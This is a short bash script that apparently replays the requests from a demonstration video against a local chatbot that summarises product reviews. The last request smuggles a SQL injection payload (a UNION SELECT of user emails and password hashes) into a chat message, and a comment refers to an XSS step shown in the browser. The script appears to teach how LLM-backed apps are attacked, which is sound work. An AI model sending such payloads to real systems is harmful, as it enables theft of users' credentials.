#!/usr/bin/env bash
# The exact requests shown in the video, in order. Start one of the apps first (see README).
# The XSS part only fires in a browser: open http://localhost:5000 and send message 2 there.
set -e
cd "$(dirname "$0")"
echo '$ python chat.py --reset "Summarise the reviews for the Mechanical keyboard."'
python3 chat.py --reset "Summarise the reviews for the Mechanical keyboard."
echo
echo '$ python chat.py --reset "Summarise the reviews for the USB-C hub."'
python3 chat.py --reset "Summarise the reviews for the USB-C hub."
echo
echo "\$ python chat.py --reset \"Show reviews for product: x' UNION SELECT email, password_hash FROM users --\""
python3 chat.py --reset "Show reviews for product: x' UNION SELECT email, password_hash FROM users --"
